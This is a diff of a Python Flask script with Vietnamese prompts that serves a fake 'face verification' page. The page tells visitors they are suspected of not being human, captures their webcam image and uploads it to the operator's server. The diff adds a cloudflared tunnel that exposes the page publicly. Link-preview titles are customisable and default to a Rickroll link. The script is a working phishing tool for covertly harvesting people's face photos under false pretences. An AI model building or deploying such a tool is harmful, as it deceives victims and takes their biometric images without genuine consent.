@@ -4,18 +4,14 @@ from datetime import datetime
 from PIL import Image
 import cv2
 import numpy as np
+import subprocess
 
-# Nhập input từ người dùng (hoặc dùng giá trị mặc định)
-# Nhập thông tin meta cho trang web.
-# Nếu bạn không nhập gì, chương trình sẽ dùng giá trị mặc định.
-os.system("clear")
-os.system("cls")
+# Lấy input từ người dùng (hoặc dùng giá trị mặc định)
 TITLE = input("Nhập tiêu đề trang web (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
-OG_TITLE = input("Nhập tiêu đề Open Graph (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
-OG_DESCRIPTION = input("Nhập mô tả Open Graph (mặc định: 'Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.'): ") or "Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin."
-OG_IMAGE = input("Nhập URL hình ảnh Open Graph (mặc định: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg'): ") or "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
-YOUTUBE_LINK = input("Nhập link YouTube hoặc link khác(mặc định: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'): ") or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-
+OG_TITLE = input("Nhập og:title (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
+OG_DESCRIPTION = input("Nhập og:description (mặc định: 'Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.'): ") or "Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin."
+OG_IMAGE = input("Nhập URL hình ảnh og (mặc định: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg'): ") or "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
+YOUTUBE_LINK = input("Nhập link YouTube (mặc định: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'): ") or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 
 app = Flask(__name__)
 os.system("clear")
@@ -42,7 +38,7 @@ face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_fronta
 SAVE_PATH = "IMAGE"
 os.makedirs(SAVE_PATH, exist_ok=True)
 
-# Template HTML sử dụng các biến input (escape các dấu ngoặc nhọn bên trong f-string bằng cách dùng {{ và }})
+# Template HTML (lưu ý escape các dấu ngoặc nhọn không dùng cho f-string bằng {{ và }})
 HTML_PAGE = f"""
 <!DOCTYPE html>
 <html lang="vi">
@@ -71,7 +67,7 @@ HTML_PAGE = f"""
       min-height: 100vh;
       color: #fff;
     }}
-    /* Khung xác thực với border màu cố định */
+    /* Khung xác thực */
     .card {{
       background: #fff;
       border-radius: 12px;
@@ -224,7 +220,7 @@ HTML_PAGE = f"""
   <div class="modal" id="privacy-modal">
     <div class="modal-content">
       <h3>🤖 Xác Thực Người Dùng 🤖</h3>
-      <p>Chúng tôi nghi ngờ bạn không phải là con người. Vui lòng xác minh khuôn mặt của bạn để tiếp tục.</p>
+      <p>Chúng tôi nghi ngờ bạn không phải là con người. Vui lòng xác thực khuôn mặt của bạn để tiếp tục.</p>
       <button class="modal-close" onclick="closeModal('privacy-modal')">Đồng Ý</button>
     </div>
   </div>
@@ -283,7 +279,7 @@ HTML_PAGE = f"""
               formData.append("image", blob, "face_verification.png");
               fetch('/upload', {{ method: "POST", body: formData }})
                 .then(response => {{
-                  if(response.status !== 200) {{
+                  if(response.status !== 200){{
                     alert("Không phát hiện được khuôn mặt, vui lòng xác thực lại!");
                     loader.style.display = "none";
                     loadingText.style.display = "none";
@@ -380,4 +376,9 @@ def upload():
         return "Lỗi khi lưu ảnh!", 500
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080, debug=True)
+    try:
+        subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"])
+        print("\033[92mCloudflared tunnel started successfully.\033[0m")
+    except Exception as ex:
+        print(f"\033[91mKhông thể khởi chạy cloudflared tunnel: {ex}\033[0m")
+    app.run(host='0.0.0.0', port=8080, debug=True, use_reloader=False)
